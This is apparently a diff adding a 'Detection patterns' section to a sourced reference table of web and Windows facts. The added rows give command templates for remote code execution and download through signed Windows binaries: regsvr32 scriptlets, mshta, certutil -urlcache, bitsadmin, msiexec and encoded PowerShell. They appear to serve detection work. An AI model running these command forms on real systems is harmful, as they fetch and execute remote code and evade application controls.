@@ -75,3 +75,12 @@ All rows re-checked 2026-10-02 unless noted. Paths not stated by the vendor stay
 |---|---|---|---|
 | Cross-document view transitions | `@view-transition { navigation: auto; }` opts same-origin navigations in; `navigation: none` opts out; not Baseline (progressive enhancement) | https://developer.mozilla.org/en-US/docs/Web/CSS/@view-transition | 2026-10-01 (verified in Chromium/Edge 152 via `pageswap` `viewTransition`) |
 | Speculation rules via HTTP header | `Speculation-Rules: "<url>"`; the rules file must be served as `application/speculationrules+json`; same JSON as inline rules | https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Speculation-Rules | 2026-10-01 (an invalid `href_matches` pattern disables the whole rule set; verified `deliveryType: navigational-prefetch` in Edge) |
+
+## Detection patterns (round 4)
+
+| Topic | Claim relied on | Source | Checked |
+|---|---|---|---|
+| PowerShell `-EncodedCommand` | Accepts base64 of a **UTF-16LE** string (`[System.Text.Encoding]::Unicode`); aliases `-e`, `-ec` (Windows PowerShell 5.1 also accepts unambiguous prefixes such as `-enc`) | https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh | 2026-10-09 |
+| Regsvr32 remote scriptlet | `regsvr32 /s /n /u /i:<remote .sct URL> scrobj.dll` executes code from a remote scriptlet (AWL bypass, T1218.010) | https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/ | 2026-10-09 |
+| Mshta remote execution | `mshta <URL>`, and `mshta javascript:...` / `mshta vbscript:...` loading a remote scriptlet, run remote content | https://lolbas-project.github.io/lolbas/Binaries/Mshta/ | 2026-10-09 |
+| Other LOLBAS downloaders and executors | Rundll32 (`javascript:`, `url.dll`), Msiexec (`/i <URL>`), Certutil (`-urlcache -f <URL> <file>`), Bitsadmin (`/transfer <name> <URL> <file>`) | https://lolbas-project.github.io/ (per-binary pages) | 2026-10-09 (Regsvr32 and Mshta pages read; the others from the project index, not re-read) |
